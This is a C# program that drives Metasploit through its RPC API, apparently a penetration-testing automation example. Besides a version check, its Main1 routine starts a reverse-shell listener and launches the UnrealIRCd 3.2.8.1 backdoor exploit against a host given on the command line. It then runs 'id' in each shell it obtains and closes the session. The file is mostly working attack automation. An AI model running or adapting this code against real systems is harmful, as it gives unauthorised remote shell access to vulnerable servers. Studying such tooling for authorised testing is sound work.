using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using MsgPack;

namespace MetasploitAutomatic
{
     class Program
     {
          static void Main(string[] args)
          {
               // Testing MetasploitSession Class from RPC socket
               string listenAddr = args[0];
               using (MetasploitSession session = new MetasploitSession("username","password","http://"+listenAddr+":55553/api"))
               {
                    if (string.IsNullOrEmpty(session.Token))
                         throw new Exception("Login Failed. Check credentials");

                    Dictionary<object, object> version = session.Execute("core.version");

                    Console.WriteLine("Version: "+version["version"]);
                    Console.WriteLine("Ruby: "+version["ruby"]);
                    Console.WriteLine("API: "+version["api"]);
               }
               
          }

          static void Main1(string[] args)
          {
               string listenAddr = args[1];
               int listenPort = 4444;
               string payload = "cmd/unix/reverse";

               using (MetasploitSession session = new MetasploitSession("username","password","http://"+listenAddr+":55553/api"))
               {
                    if (string.IsNullOrEmpty(session.Token))
                         throw new Exception("Login Failed. Check credentials");

                    using (MetasploitManager manager = new MetasploitManager(session))
                    {
                         Dictionary<object, object> response = null;

                         Dictionary<object, object> opts = new Dictionary<object, object>();
                         opts["ExitOnSession"] = false;
                         opts["PAYLOAD"] = payload;
                         opts["LHOST"] = listenAddr;
                         opts["LPORT"] = listenPort;

                         response = manager.ExecuteModule("exploit", "multi/handler", opts);
                         object jobID = response["job_id"];

                         // Vuln Exploit
                         opts = new Dictionary<object, object>();
                         opts["RHOST"] = args[0];
                         opts["DisablePayloadHandler"] = true;
                         opts["LHOST"] = listenAddr;
                         opts["LPORT"] = listenPort;
                         opts["PAYLOAD"] = payload;

                         manager.ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);

                         response = manager.ListJobs();
                         while (response.ContainsValue("Exploit: unix/irc/unreal_ircd_3281_backdoor"))
                         {
                              Console.WriteLine("Waiting");
                              System.Threading.Thread.Sleep(10000);
                              response = manager.ListJobs();
                         }

                         response = manager.StopJob(jobID.ToString());

                         response = manager.ListSessions();
                         foreach (var pair in response)
                         {
                              string sessionID = pair.Key.ToString();
                              manager.WriteToSessionShell(sessionID, "id\n");
                              System.Threading.Thread.Sleep(1000);
                              response = manager.ReadSessionShell(sessionID);
                              Console.WriteLine("We are user: " + response["data"]);
                              Console.WriteLine("Killing session: " + sessionID);
                              manager.StopSession(sessionID);
                         }
                    }
               }
          }
     }

     public class MetasploitSession : IDisposable
     {
          string _host;
          string _token;

          public MetasploitSession(string username, string password, string host)
          {
               _host = host;
               _token = null;

               Dictionary<object, object> response = this.Authenticate(username, password);

               bool loggedIn = !response.ContainsKey("error");
               if (!loggedIn)
                    throw new Exception(response["error_message"] as string);
               if ((response["result"] as string) == "success")
                    _token = response["token"] as string;
          }

          public string Token
          {
               get { return _token; }
          }

          public Dictionary<object, object> Authenticate(string username, string password)
          {
               return this.Execute("auth.login", username, password);
          }

          public Dictionary<object, object> Execute(string method, params object[] args)
          {
               if (method != "auth.login" && string.IsNullOrEmpty(_token))
                    throw new Exception("Not Authenticated.");

               HttpWebRequest request = (HttpWebRequest)WebRequest.Create(_host);
               request.ContentType = "binary/message-pack";
               request.Method = "POST";
               request.KeepAlive = true;

               using (Stream requestStream = request.GetRequestStream())
               using (Packer msgpackWriter = Packer.Create(requestStream))
               {
                    bool sendToken = (!string.IsNullOrEmpty(_token) && method != "auth.login");
                    msgpackWriter.PackArrayHeader(1 + (sendToken ? 1 : 0) + args.Length);
                    msgpackWriter.Pack(method);

                    if (sendToken)
                         msgpackWriter.Pack(_token);
                    foreach (object arg in args)
                         msgpackWriter.Pack(arg);
               }

               using (MemoryStream mstream = new MemoryStream())
               {
                    using (WebResponse response = request.GetResponse())
                    using (Stream rstream = response.GetResponseStream())
                         rstream.CopyTo(mstream);

                    mstream.Position = 0;

                    MessagePackObjectDictionary resp = Unpacking.UnpackObject(mstream).AsDictionary();
                    return MessagePackToDictionary(resp);
               }
          }

          private object GetObject(MessagePackObject str)
          {
               if (str.UnderlyingType == typeof(byte[]))
                    return System.Text.Encoding.ASCII.GetString(str.AsBinary());
               else if (str.UnderlyingType == typeof(string))
                    return str.AsString();
               else if (str.UnderlyingType == typeof(byte))
                    return str.AsByte();
               else if (str.UnderlyingType == typeof(bool))
                    return str.AsBoolean();

               return null;
          }

          Dictionary<object, object> MessagePackToDictionary(MessagePackObjectDictionary dict)
          {
               Dictionary<object, object> newDict = new Dictionary<object, object>();
               foreach (var pair in dict)
               {
                    object newKey = GetObject(pair.Key);
                    if (pair.Value.IsTypeOf<MessagePackObjectDictionary>() == true)
                         newDict[newKey] = MessagePackToDictionary(pair.Value.AsDictionary());
                    else
                         newDict[newKey] = GetObject(pair.Value);
               }

               return newDict;
          }

          public void Dispose()
          {
               if (this.Token != null)
               {
                    this.Execute("auth.logout", this.Token);
                    _token = null;
               }
          }
     }

     public class MetasploitManager : IDisposable
     {
          private MetasploitSession _session;

          public MetasploitManager(MetasploitSession session)
          {
               _session = session;
          }

          public Dictionary<object,object> ListJobs()
          {
               return _session.Execute("job.list");
          }

          public Dictionary<object,object> StopJob(string jobID)
          {
               return _session.Execute("job.stop", jobID);
          }

          public Dictionary<object,object> ExecuteModule(string moduleType, string moduleName, Dictionary<object,object> options)
          {
               return _session.Execute("module.execute", moduleType, moduleName, options);
          }

          public Dictionary<object,object> ListSessions()
          {
               return _session.Execute("session.list");
          }

          public Dictionary<object,object> StopSession(string sessionID)
          {
               return _session.Execute("session.stop", sessionID);
          }

          public Dictionary<object,object> ReadSessionShell(string sessionID, int? readPointer = null)
          {
               if (readPointer.HasValue)
                    return _session.Execute("session.shell_read", sessionID, readPointer.Value);
               else
                    return _session.Execute("session.shell_read", sessionID);
          }

          public Dictionary<object,object> WriteToSessionShell(string sessionID, string data)
          {
               return _session.Execute("session.shell_write", sessionID, data);
          }

          public void Dispose()
          {
               _session = null;
          }
     }

}
